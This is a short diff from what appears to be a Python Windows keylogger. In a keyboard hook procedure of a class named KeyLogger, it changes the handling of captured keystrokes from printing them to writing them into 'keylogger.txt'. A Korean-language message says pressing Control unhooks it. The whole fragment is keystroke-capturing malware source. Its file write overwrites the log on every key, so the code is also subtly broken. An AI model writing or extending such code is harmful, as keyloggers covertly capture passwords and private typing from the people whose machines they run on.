@@ -48,7 +48,9 @@ def hookProc(nCode, wParam, lParam):
     if wParam is not WM_KEYDOWN:
         return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
     hookedKey = chr(lParam[0])
-    print (hookedKey)
+    op = open('keylogger.txt', 'w')
+    op.write(hookedKey)
+    op.close()
 
     if(CTRL_CODE == int(lParam[0])):
         print ("컨트롤 눌렀음, 언훅 할꼐욤")
